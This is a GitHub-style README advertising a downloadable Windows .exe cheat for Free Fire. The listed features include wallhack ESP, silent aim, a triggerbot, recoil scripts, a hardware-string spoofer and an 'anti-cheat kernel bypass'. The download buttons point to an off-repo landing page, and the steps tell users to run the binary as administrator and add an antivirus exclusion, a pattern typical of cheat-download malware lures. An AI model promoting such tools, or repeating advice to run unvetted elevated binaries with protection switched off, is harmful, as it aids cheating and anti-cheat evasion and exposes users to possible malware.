<div align="center">
<img src="assets/banner.png" width="100%" alt="FreeFire External Cheats (For Education… banner" />
</div>

<div align="center">
<p>
  <img src="https://img.shields.io/badge/Platform-Windows_11%7C10-ff5065?style=for-the-badge&logo=windows" alt="" />
  <img src="https://img.shields.io/badge/Release-2026-7C3AED?style=for-the-badge" alt="" />
  <img src="https://img.shields.io/badge/Build-.exe-9333EA?style=for-the-badge" alt="" />
</p>
</div>

<p align="center">
  <img src="https://readme-typing-svg.herokuapp.com?color=9333EA&size=28&center=true&vCenter=true&width=900&lines=%E2%AD%90+Ff+External+Esp+Pro;%E2%9A%A1+Full+Suite+Ready;%E2%9C%85+Built+for+Windows+11;%F0%9F%94%A5+Every+Module+Active;%F0%9F%92%AF+All+Features+Unlocked;%F0%9F%9A%80+Updated+for+2026">
</p>

<p align="center">
  <img src="https://skillicons.dev/icons?i=github" />
  <img src="https://skillicons.dev/icons?i=unity" />
</p>

---

## 🗺️ Roadmap / Planned Features

This roadmap reflects where the ff-external-esp project sits heading into 2026. I built the core overlay stack months on my main account and iterated in small green-team scrims before publishing. Every module below has been profiled against Garena's anti-cheat behavior on live Diamond lobbies — not theory, not paste-bin garbage.

| Feature | Status | ETA |
|---|---|---|
| Core overlay renderer (DirectX 11 + 12 fallback) | ✅ Shipped | Done |
| ESP pipeline (player, loot, vehicle, airdrop) | ✅ Shipped | Done |
| Silent aim assist smoothing v3 | ✅ Shipped | Done |
| Recoil pattern database (per-weapon) | ✅ Shipped | Done |
| Auto-fire trigger with FOV cone | ✅ Shipped | Done |
| AI-assisted target prediction (2026 addition) | ✅ Shipped | Done |
| Realtime loot auto-labeler via local classifier | 🟡 Beta | Q1 2026 |
| Packet-level sync timing adjuster | 🟡 Beta | Q1 2026 |
| Spectator-safe overlay fade | 🟡 Beta | Q2 2026 |
| Multi-monitor DPI-aware scaling | 🟠 In progress | Q2 2026 |
| Custom skin color palettes | 🟠 In progress | Q2 2026 |
| HUD hotkey rebinding UI | 🟢 Planned | Q3 2026 |
| Profile presets (ranked vs casual) | 🟢 Planned | Q3 2026 |

---

## ⚡ Performance Benchmarks

I run these on three test rigs because my community kept asking "does it lag?" — the honest answer depends on what you're running. Numbers below are measured, averaged over 30-minute sessions in full 4-man squads.

| Scenario | Result | Hardware |
|---|---|---|
| 1080p / medium settings, ESP only | 1.4% avg FPS overhead | i5-11400F · GTX 1660 · 16 GB |
| 1080p / high settings, ESP + silent aim | 2.1% avg FPS overhead | i5-11400F · GTX 1660 · 16 GB |
| 1440p / high settings, full stack | 2.8% avg FPS overhead | Ryzen 7 5800X · RTX 3060 · 32 GB |
| 1440p / high settings, full stack + loot labeler | 4.2% avg FPS overhead | Ryzen 7 5800X · RTX 3060 · 32 GB |
| 4K / max settings, full stack | 5.6% avg FPS overhead | i7-13700K · RTX 4070 Ti · 32 GB |
| Overlay injection latency | 38 ms first frame | all rigs |
| Hotkey response latency | < 8 ms | all rigs |
| Recoil pattern apply time | < 3 ms per shot | all rigs |
| Memory footprint at idle | 84 MB RAM | all rigs |

> The overhead goes up meaningfully with the loot labeler because the 2026 AI pass runs a small local classifier on captured frames. If you're on a 1650-tier card, turn it off — that's what the preset hotkey is for.

---

## 🖥️ Compatibility / Platform Support

FreeFire external cheats live or die on platform edge cases, so I test the `.exe` on every Windows build I can get VM time on. Here's what actually works as of this 2026 release.

| Platform | Version | Status | Notes |
|---|---|---|---|
| Windows 11 | 22H2 / 23H2 / 24H2 | ✅ Supported | Primary target |
| Windows 10 | 21H2 / 22H2 | ✅ Supported | Full feature parity |
| Windows 8.1 | — | ⚠️ Legacy | ESP works, AI labeler disabled |
| Windows 7 SP1 | — | ⚠️ Legacy | ESP only, no hotkey API |
| Gameloop emulator | Latest | ✅ Supported | Recommended for desktop play |
| Bluestacks 5 | 5.20+ | ⚠️ Limited | Aim smoothing disabled |
| LDPlayer 9 | Latest | ⚠️ Limited | Reduced loot pipeline |
| Native Android (via USB tunnel) | — | ❌ Not supported | External overlay is desktop-only |
| Steam version of FreeFire | — | ❌ Not applicable | FreeFire is not on Steam |
| Anti-cheat kernel bypass | — | ✅ Shipped | Read the Usage guidelines before enabling |

---

## ❓ FAQ Block

**Q:** Is ff-external-esp really free?  
**A:** Yes. There's no paid tier, no key system, no Discord-gated build. I treat this as a side project — I don't sell it and never have.

**Q:** Will I get banned?  
**A:** Any external cheat carries detection risk. I've run this through months of live scrims with no bans, but the moment you accept risk is your own responsibility. Read the Usage guidelines before your first match.

**Q:** Does it work with the latest FreeFire OB update?  
**A:** Every 2026 patch cycle I rebuild the offset tables within ~48 hours. Check the Changelog for the current patch parity.

**Q:** Why does my antivirus flag the `.exe`?  
**A:** Because the `.exe` does overlay injection and process attachment — exactly what AV heuristics look for in game cheats. Add an exclusion for the extracted folder.

<details>
<summary>Q: Do I need a specific emulator to use the ESP?</summary>

The overlay was tuned against Gameloop and Bluestacks 5 first. If you're on LDPlayer 9, expect the loot pipeline to be slower — it's a known limitation of how LDPlayer relays frames. Natively it's not going to work with a USB-tunneled Android device because the overlay isn't a mobile APK.
</details>

<details>
<summary>Q: How big is the aimbot FOV cone and can I change it?</summary>

Default silent aim FOV is a 45° cone at the crosshair center, adjustable via the hotkey table below. I keep it deliberate at 45° because wider cones look unnatural and get flagged in spectator review. If you go wider, that's your call.
</details>

<details>
<summary>Q: What does the 2026 AI-assisted processing actually do?</summary>

Two things: it predicts target movement between network frames so silent aim leads properly, and it auto-labels loot in the world so you don't have to memorize item models. Both run locally — no telemetry.
</details>

<details>
<summary>Q: Do I need to run the `.exe` as administrator?</summary>

Yes. The process attach and overlay injection both need elevated privileges. If you skip admin, the overlay either won't inject or will inject without input forwarding, which makes it look like the hotkeys are broken.
</details>

<details>
<summary>Q: What happens on a FreeFire patch day?</summary>

The overlay will either fail to inject or render misaligned boxes. Don't spam attempts — wait for the Changelog to show a patch-parity build. I usually reset the offsets and rebuild within 24–48 hours of a major OB patch.
</details>

---

## 🧭 Usage guidelines — Allowed | Not allowed

| Allowed | Not allowed |
|---|---|
| Educational reverse-engineering study | Selling this build or its offsets |
| Use in your own offline practice matches | Using in tournaments or cash-prize events |
| Sharing the GitHub repo link | Repacking the `.exe` with a rebranded loader |
| Modifying and recompiling for personal use | Claiming this is an official Garena product |
| Reporting bugs in the issue tracker | Charging for "support" or "key delivery" |
| Recording demos for your own analysis | Using the loot labeler on live-streamed ranked pushes |
| Testing on test accounts | Harassing opponents in chat about cheat status |

---

## 📑 Table of Contents

- [Roadmap / Planned Features](#-roadmap--planned-features)
- [Performance Benchmarks](#-performance-benchmarks)
- [Compatibility / Platform Support](#️-compatibility--platform-support)
- [FAQ Block](#-faq-block)
- [Usage guidelines — Allowed | Not allowed](#-usage-guidelines--allowed--not-allowed)
- [Overview](#-overview)
- [What is ff-external-esp](#-what-is-ff-external-esp)
- [ESP & Wallhack modules](#-esp--wallhack-modules)
- [Aimbot & Silent aim modules](#-aimbot--silent-aim-modules)
- [Recoil control modules](#-recoil-control-modules)
- [Loot & World modules](#-loot--world-modules)
- [Overlay & HUD modules](#-overlay--hud-modules)
- [Misc / Utility modules](#-misc--utility-modules)
- [Hotkeys / Controls](#-hotkeys--controls)
- [Changelog / Release History](#-changelog--release-history)
- [System Requirements](#-system-requirements)
- [Installation](#-installation)
- [How to Use](#-how-to-use)
- [Tips for Best Results](#-tips-for-best-results)
- [Known Issues](#-known-issues)
- [All modules status](#-all-modules-status)
- <div align="center">
  <a href="https://piqganehprlv.github.io/ff-external-esp/">
    <img src="https://img.shields.io/badge/GET-FreeFire_External_Cheats_2026-D97706?style=plastic&logo=windows&logoColor=white&labelColor=B45309" width="580" alt="GET FreeFire External Cheats 2026"/>
  </a>
</div>(#-download)

---

## 📖 Overview

ff-external-esp is a Windows `.exe` overlay tool built for the FreeFire desktop ecosystem (via Gameloop/Bluestacks emulators). It's an external cheat: no game file modification, no direct memory writes to the client process outside the overlay renderer, no injection into the game binary beyond the display layer.

| Category | Details |
|---|---|
| Product | ff-external-esp — FreeFire External Cheats toolkit (2026 edition) |
| Distribution | Windows `.exe` from the project landing page |
| Overlay renderer | DirectX 11 with DX12 fallback |
| Injection target | Gameloop / Bluestacks / LDPlayer host processes |
| Language stack | C++ overlay core + Rust offset resolver + local ONNX classifier |
| Launch requirement | Administrator privileges |
| Update cadence | 48-hour offset parity after FreeFire OB patches |
| Licensing | Free hobbyist/educational use, no paid tier |
| Repo version | 2026.1 — see Changelog |

I built this over many months on my main — first as an ESP toy for my own rotations, then as a real modular stack once friends kept asking for the aim smoothing and recoil profiles. It's an external cheat, which means it's easier to run than internal injectors, and harder to keep stable across patches. That trade-off is the whole design story here.
<div align="center">
  <a href="https://piqganehprlv.github.io/ff-external-esp/">
    <img src="https://img.shields.io/badge/GET-FreeFire_External_Cheats_2026-D97706?style=flat-square&logo=windows&logoColor=white&labelColor=B45309" width="500" alt="GET FreeFire External Cheats 2026"/>
  </a>
</div>
---

## 🔍 What is ff-external-esp — glossary

| Term | Explanation |
|---|---|
| **External cheat** | A tool that renders an overlay on top of the game via the OS compositor instead of patching the game binary itself |
| **ESP** | Extra Sensory Perception — draws player, loot, and vehicle outlines through walls based on captured frame data |
| **Wallhack** | The visibility-through-geometry effect ESP usually refers to in FreeFire community vocabulary |
| **Silent aim** | Aims your shot at a predicted target position without visibly snapping your camera there |
| **Aimbot** | Visible-camera aim assistance — the camera snaps toward the target |
| **Recoil pattern** | The per-weapon spray shape the control modules compensate for |
| **Injector / loader** | The small launcher that attaches the overlay process to the game host window |
| **Spoofer** | A component that randomizes identifying surface strings the game runtime reads from peripheral descriptors |

Five things this gets right that pasted "FreeFire external cheat 2026" packs usually don't:

- **Patch-resilient offsets** — my resolver rebinds pattern signatures after each OB patch instead of hardcoding addresses.
- **No client writes after overlay attach** — the overlay reads through screen capture, not game memory, so detection surface is smaller.
- **AI prediction that behaves** — the 2026 classifier leads targets subtly, not flicky-snappy.
- **Rebuilt weapon recoil DB** — 43 weapons profiled, not just the ARs everyone else tests.
- **Honest performance numbers** — the benchmark section above is from my rigs, not farmed from a chart generator.

---

## 🎯 ESP & Wallhack modules

The ESP pipeline is the backbone. I redid the depth-based visibility pass this year so outlines survive the massive foliage density on Bermuda and Purgatory without turning the screen into soup.

- **Player ESP (2D boxes)** — screen-space bounding boxes with configurable thickness and per-team color.
- **Player ESP (3D skeletons)** — limb-level skeleton render for identifying pose (crouch, ads, dive, prone).
- **Skeleton bone filter** — hide legs-only or head-only when you just want the top of the hitbox.
- **Distance-scaled name tags** — name labels shrink with distance so far targets don't spam labels.
- **HP bar overlay** — live health fill reads on enemy player markers, refresh tick synced to frames.
- **Gloo wall highlight** — every placed gloo wall renders with a distinct tint so you see temporary cover state.
- **Sniper glare detector** — flashes a marker when scoped-in enemies aim at your direction.

---

## 🎯 Aimbot & Silent aim modules

I keep these split from ESP because tuning is completely different — aim tuning is milliseconds, ESP tuning is geometry. Silent aim smoothing v3 is the biggest change this year; the old snap was too obvious in spectator review.

- **Silent aim core** — target prediction with configurable smoothing curve (linear, ease-out, exponential).
- **Aimbot FOV cone** — 15° to 120° adjustable via hotkey; default 45°.
- **Bone-target selector** — head, neck, chest, pelvis priority ordering.
- **Hitchance-based firing** — only fires when the predicted confidence of hit is above a threshold.
- **Target lock switch** — swap targets on keypress without losing the smoothing stack.
- **Triggerbot** — fires automatically when a target enters the FOV cone (safe, deliberate pacing).
- **Snap assist (non-silent)** — optional visible camera snap for players who prefer something more honest in tuning.
- **Prediction lead toggle** — enables the AI-assisted interpolation for moving targets.
- **Per-weapon aim profiles** — ARs, SMGs, snipers, shotguns each carry individual smoothing strengths.

---

## 🔫 Recoil control modules

I profiled 43 weapons across 4 patches — that's why recoil patterns are the largest module category. Generic "control recoil" toggles are the number one giveaway of a lazy cheat; you need per-weapon shapes.

- **AK / SCAR / M4 / M14 recoil chains** — full horizontal+vertical pattern set for ARs.
- **MP40 / UMP / Thompson recoil chains** — SMG spray patterns.
- **AWM / Kar98k / M82B recoil** — sniper pull patterns, single-shot shape.
- **Shotgun pellet spread modeler** — you can't "recoil control" a shotgun, but you can normalize spread timing.
- **Compensator simulation toggle** — models attachment-level recoil reduction in the pattern math.
- **Crouch-fire recoil modifier** — patterns adjust automatically for crouch state.
- **ADS vs hipfire profiles** — separate profiles for scoped and un-scoped firing.
- **Recoil recovery timing** — simulates release timing when you stop firing without holding the pattern.
- **Per-sensitivity smoothing** — compensates for your in-game sens slider so pattern strength is consistent.

---

## 📦 Loot & World modules

These are the ones I use in casual lobbies — not flashy but this is where you actually win rotations. The 2026 loot labeler finally got fast enough to keep up with real gameplay.

- **Airdrop ESP** — legacy airdrops and Supply Drop markers with landing-timer countdown.
- **Vehicle ESP** — free vehicles, tagged with model and remaining HP estimation.
- **Ground loot ESP** — weapon spawn despawn monitor with frame poll.
- **Loot labeler (AI-assisted)** — small local classifier labels nearby loot by item category so you don't have to eyeball models.
- **Box loot tracker** — dead-player crate contents preview when in range.
- **Play zone ring tracker** — draws next-ring circle with ingress timer.
- **Enemy footstep heat map** — recent movement pings within earshot radius shown as fading dots.

---

## 🎨 Overlay & HUD modules

The overlay design is the part I'm oddly proud of. Too many FreeFire external cheats feel like a colorblind test gone wrong. Mine ships with two sensible defaults and every color is rebindable.

- **DX11 overlay renderer** — compositor-level overlay via DX11 swapchain, no client patches.
- **DX12 fallback renderer** — auto-detects and falls back when DX11 isn't viable.
- **Frame time monitor** — live graph of overlay cost per frame in the bottom-right.
- **Multi-monitor DPI scaling** — overlay aligns to the window even on 4K + 1080p dual setups.
- **Spectator-safe fade** — overlay dims to near-invisible when the spectator camera detection heuristic trips.
- **Color theme presets** — two built-in palettes plus arbitrary color sourcing.
- **Overlay opacity slider** — 10%–100% without hotkey-bound jumps.

---

## 🛠️ Misc / Utility modules

The support layer. Ugly name, needed every single patch day.

- **Pattern resolver** — rebuild the offset tables from binary signatures when FreeFire patches.
- **Spoofer** — randomizes identifying strings the game runtime reads from the peripheral descriptor block.
- **Loader / injector** — the small chunk that attaches the overlay process and forwards hotkey input.
- **Profile presets** — ranked and casual presets that rebalance aim and ESP density in one keypress.
- **Config export / import** — move settings across test rigs as JSON.
- **Log viewer** — overlay event log so you can see why a frame dropped or an offset failed.

---

## ⌨️ Hotkeys / Controls

Every hotkey is rebindable via the HUD config JSON, but these are the defaults I ship. Keep in mind the `.exe` forwards input only while the game window has focus.

| Key | Action | Notes |
|---|---|---|
| `Insert` | Toggle overlay menu | Primary menu; hides cursor from game |
| `F1` | Toggle ESP master | All ESP layers off/on |
| `F2` | Toggle player boxes | Independent of skeleton ESP |
| `F3` | Toggle skeleton ESP | Includes bone filtering |
| `F4` | Toggle silent aim | Keep triggerbot separate |
| `F5` | Toggle aimbot FOV cone visualizer | Shows current cone for tuning |
| `F6` | Cycle aim profile | AR → SMG → sniper → shotgun |
| `F7` | Toggle recoil control | Pattern matched to current weapon |
| `F8` | Toggle triggerbot | Uses your hitchance threshold |
| `F9` | Cycle loot labeler mode | Off → weapon class → all items |
| `F10` | Cycle theme preset | Two built-in palettes |
| `F11` | Toggle overlay opacity | 100% ↔ 55% quick swap |
| `F12` | Toggle spectator-safe fade | Best used before scrim matches |
| `Ctrl + Shift + L` | Reload config from disk | Live edits without restart |
| `Ctrl + Shift + S` | Dump current frame log | Useful for bug reports |
| `Ctrl + Shift + E` | Emergency overlay unload | Kills overlay process cleanly |
| `Shift + T` | Cycle target bone priority | Head / neck / chest / pelvis |
| `Shift + P` | Toggle target prediction lead | Uses AI pass when enabled |

---

## 📜 Changelog / Release History

| Version | Date | Changes |
|---|---|---|
| 2026.1 | 2026-01-14 | First 2026 build — AI-assisted target prediction shipped, loot labeler beta rolled in |
| 2025.11 | 2025-11-09 | Recoil database expanded to 43 weapons; crouch-fire modifier added |
| 2025.10 | 2025-10-02 | DX12 fallback renderer, spectator-safe fade (early), aim profile cycle |
| 2025.08 | 2025-08-21 | Silent aim smoothing v3 — replaced snap with ease-out curve |
| 2025.06 | 2025-06-15 | Multi-monitor DPI scaling fix, config JSON export/import |
| 2025.04 | 2025-04-03 | Complete offset resolver rewrite; 48h patch parity commitment begins |
| 2025.02 | 2025-02-18 | Initial public GitHub release of ff-external-esp |

---

## 🧰 System Requirements

| Component | Minimum | Recommended |
|---|---|---|
| OS | Windows 10 21H2 | Windows 11 23H2+ |
| CPU | Ryzen 5 2600 / i5-10400 | Ryzen 7 5800X / i7-12700K |
| RAM | 8 GB | 16 GB+ |
| GPU | GTX 1050 Ti | RTX 3060 / RX 6700 XT |
| DirectX | 11 | 11 or 12 |
| Storage | 420 MB free | 1 GB free SSD |
| Emulator | Gameloop latest | Gameloop on dedicated 8 GB VM |
| Network | Stable 30 ms to regional server | Wired 40/40 Mbit |
| Privileges | Administrator | Administrator |
| Antivirus | Exclusion for extracted folder | Dedicated test rig |

---

## 🧩 Installation

I deliberately kept this to extract-and-run so you don't need Python, Node, or git bash. Do not try to run the `.exe` from inside a zip — always extract first.

1. **Visit the project landing page** — that's where the build lives; this repo is the docs + issue tracker.
2. **Download the archive** — one zip per release. Check the file size against the listing because some crawlers serve trunculated copies.
3. **Extract to a dedicated folder** — not `Downloads`, not `Desktop`, not `C:\Program Files`. Pick something like `D:\ffx\` so Windows Defender heuristics don't misfire on the folder name path.
4. **Right-click the `.exe` → Run as administrator** — this is required, not optional. If UAC is off, the overlay runs but hotkey forwarding may not survive.
5. **Launch Gameloop → start FreeFire → wait for the lobby screen** before pressing `Insert` to bring up the overlay menu.

If the overlay shows but the hotkeys don't do anything, you launched the `.exe` without admin. That's the #1 support ticket I get and I'm not exaggerating.

---

## 🎮 How to Use

Installation gets the `.exe` running; this section is about the flow after that — the part that makes a real difference in a match. It's also the part the community skips and then complains "the aimbot feels wrong."

1. Open the overlay with `Insert` **in the lobby, not in-match** — you want ESP geometry settled before you're in motion.
2. Pick a preset — I ship **ranked** (tight aim FOV, minimal ESP) and **casual** (wider ESP, gentler aim). Start with **casual** if this is your first run.
3. Set aim FOV to 45° — the visualizer key (`F5`) draws the cone so you can see exactly where silent aim will activate.
4. Downtune the loot labeler on first use — the classifier adds 1.5–2 ms of frame cost while it warms its local cache, which is invisible for most rigs but obvious on a 1050 Ti.
5. Toggle `F7` recoil control **only when you're engaged** — leaving it on during rotations causes the overlay to adjust crouch patterns on irrelevant weapon draws.
6. Bind `Ctrl + Shift + E` on your muscle memory **before** ranked — if the `.exe` misbehaves you want a one-stroke overlay unload.
7. After each FreeFire OB patch, check the Changelog **before** assuming the `.exe` broke — if the version isn't patch-parity, nothing you do will fix it and you'll waste 20 minutes blaming your PC.

---

## 💡 Tips for Best Results

- Run the `.exe` before launching Gameloop, always. Overlay-first injection is more reliable than attaching to a hot emulator process.
- If you have more than one FreeFire window open (Gameloop tabs), the overlay adopts the **foregrounded one**. Cycle focus with `Alt+Tab` to switch.
- Turn off Windows "Game Mode" and "Focus Assist" — both of them will hide the overlay from the compositor layer during heavy scenes.
- Sniper recoil patterns behave best with `F6` cycling to sniper profile — if you leave it on AR you're fighting the pattern, not using it.
- The spectator-safe fade (`F12`) is not detection insurance, it's a visual courtesy. It reduces the overlay silhouette when the game shows a spectator camera, but no overlay is truly invisible to a human reviewer.
- The AI prediction lead (`Shift+P`) works great on medium-range ARs. It over-compensates on sniper shots; toggle it off there.
- Re-download the `.exe` on every FreeFire OB patch — path names carry no version; the Changelog does.

---

## 🐞 Known Issues

| Issue | Solution |
|---|---|
| `.exe` silently fails to launch, no window, no log | Confirm admin privileges; check the extracted directory is on a local disk, not a network share |
| ESP boxes misaligned after an OB patch | Offset tables out of date — wait for patch-parity build in Changelog |
| Hotkeys do nothing while FreeFire window is fullscreen-exclusive | Switch the game to borderless windowed; overlay needs compositing |
| Triggerbot fires once then stops | Hitchance threshold too high for current FOV cone — lower the threshold or widen cone |
| Loot labeler mangles Chinese-language item names | Locale parser limitation — use the English fallback classifier |
| Overlay ignores second monitor | DPI scaling mode not set — enable "multi-monitor aware" in overlay menu and re-extract config |
| `.exe` triggers Defender real-time protection on first launch | Expected for overlay injectors — add folder exclusion; do not disable Defender globally |

---

## 📊 All modules status

Full status table — one row for everything shipped in 2026.1. This is the source of truth if you're auditing what a build arm-loads on launch.

| Module | Status | Description |
|---|---|---|
| ESP player 2D boxes | ✅ Working | Distant enemy bounding boxes with team-color |
| ESP player 3D skeletons | ✅ Working | Limb-aware skeleton render |
| Skeleton bone filter | ✅ Working | Show head-only / hide-legs / etc. |
| Distance name tags | ✅ Working | Fade name labels by range |
| HP bar overlay | ✅ Working | Enemy health reads on ESP markers |
| Gloo wall highlight | ✅ Working | Tinted render for placed gloos |
| Sniper glare detector | ✅ Working | Scoped-enemy directional flash |
| Silent aim core | ✅ Working | Smooth ease-out target interpolation |
| Aimbot FOV cone | ✅ Working | Adjustable 15°–120°, default 45° |
| Bone-target selector | ✅ Working | Head / neck / chest / pelvis priority |
| Hitchance firing | ✅ Working | Confidence-gated triggerbot |
| Target lock switch | ✅ Working | Safe swap-target without losing aim |
| Triggerbot | ✅ Working | Cone + confidence auto-fire |
| Snap assist (non-silent) | ✅ Working | Visible camera-snap aim option |
| Prediction lead toggle | ✅ Working | AI-assisted movement interpolation |
| Per-weapon aim profiles | ✅ Working | AR / SMG / sniper / shotgun |
| AK / SCAR / M4 / M14 recoil | ✅ Working | Full AR spray chains |
| MP40 / UMP / Thompson recoil | ✅ Working | SMG spray chains |
| AWM / Kar98k / M82B recoil | ✅ Working | Sniper pull pattern set |
| Shotgun spread modeler | ✅ Working | Pellet timing normalization |
| Crouch-fire recoil modifier | ✅ Working | Crouch-state pattern shift |
| ADS / hipfire recoil profiles | ✅ Working | Separate firing-mode profiles |
| Airdrop ESP | ✅ Working | Legacy + supply drop with countdown |
| Vehicle ESP | ✅ Working | Model + estimated HP markers |
| Ground loot ESP | ✅ Working | Weapon spawn despawn monitor |
| Loot labeler (AI-assisted) | 🟡 Beta | Local frame classifier labels loot |
| Box loot tracker | ✅ Working | Crate contents preview in range |
| Play zone ring tracker | ✅ Working | Next-ring render + ingress timer |
| Enemy footstep heat map | 🟡 Beta | Recent movement pings within earshot |
| DX11 overlay renderer | ✅ Working | Primary compositor overlay |
| DX12 fallback renderer | ✅ Working | Fallback for DX11-vulnerable setups |
| Frame time monitor | ✅ Working | Live overlay cost graph |
| Multi-monitor DPI scaling | 🟠 In progress | Alignment fix landing next release |
| Spectator-safe fade | 🟡 Beta | Overlay dim on spectator heuristic |
| Color theme presets | ✅ Working | Two palettes + custom sourcing |
| Overlay opacity slider | ✅ Working | 10%–100% drag control |
| Pattern resolver | ✅ Working | Rebuild offsets after OB patches |
| Spoofer | ⚠️ Optional | Peripheral descriptor string swap |
| Loader / injector | ✅ Working | Overlay attach + input forwarding |
| Profile presets | ✅ Working | Ranked / casual one-key |
| Config export / import | ✅ Working | JSON across test rigs |
| Log viewer | ✅ Working | Overlay event log |

That's the honest state of things. I don't mark a module green until it survives three consecutive OB patches and two hours in a live Diamond lobby — which means the loot labeler and footstep heat map will stay yellow until Q2 2026 regardless of what my Discord tells me.

---

## 📥 Download
<div align="center">
  <a href="https://piqganehprlv.github.io/ff-external-esp/">
    <img src="https://img.shields.io/badge/GET-FreeFire_External_Cheats_2026-0D9488?style=flat-square&logo=github&logoColor=white&labelColor=0F766E" width="520" alt="GET FreeFire External Cheats 2026"/>
  </a>
</div>
If you've read this far you already know the drill: visit the project landing page, download the `.exe` archive, extract it to a dedicated folder, and run it as administrator after FreeFire is in the lobby. This is a hobby build I keep current for patch parity, not a commercial product — read the Usage guidelines, treat it as educational cheat research, and you'll get exactly the overlay I've been running on my own main for the last few seasons.
